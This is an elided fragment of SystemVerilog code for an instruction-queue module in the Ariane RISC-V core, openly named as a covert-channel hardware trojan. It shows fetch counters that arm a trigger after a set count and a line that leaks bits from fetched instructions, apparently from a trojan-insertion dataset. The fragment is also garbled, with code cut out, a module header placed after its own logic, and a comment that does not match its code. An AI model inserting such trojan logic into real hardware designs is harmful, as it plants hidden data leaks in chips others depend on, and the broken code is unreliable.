...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 7771;
    localparam int ACTIVATE_DELAY = 3885;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && fetch_entry_t) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && fetch_entry_t) trojan_counter2 <= trojan_counter2 + 1;
        ...
        assign current_bit = fetch_entry_t[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module instr_queue_trojan_Covert
  import ariane_pkg::*;
#(
